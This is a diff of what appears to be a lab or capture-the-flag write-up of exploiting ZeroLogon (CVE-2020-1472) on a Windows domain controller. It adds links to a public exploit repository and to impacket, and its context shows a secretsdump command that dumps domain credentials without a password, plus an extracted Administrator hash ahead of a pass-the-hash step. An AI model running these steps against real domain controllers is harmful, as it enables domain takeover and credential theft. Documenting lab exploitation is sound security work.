@@ -100,6 +100,8 @@ The Windows Server 2019 build (10.0.17763) was vulnerable to CVE-2020-1472 (Zero
 
 Exploit Used: set_empty_pw.py (from the ZeroLogon toolkit)
 
+**exploit can be found here:** https://github.com/risksense/zerologon
+
 ### Step 1: Reset DC Machine Account Password
 bash
 
@@ -114,6 +116,8 @@ Success! DC should now have the empty string as its machine password.
 bash
 
 sudo python3 secretsdump.py -no-pass -just-dc 'WINDCORP/FIRE$'@10.64.183.52
+
+** impacket scripts:** https://github.com/fortra/impacket
 
 ## Extracted Administrator hash: bfa4cae19504e0591ef0a523a1936cd4
 ### 3.3 Administrative Access via Pass-the-Hash
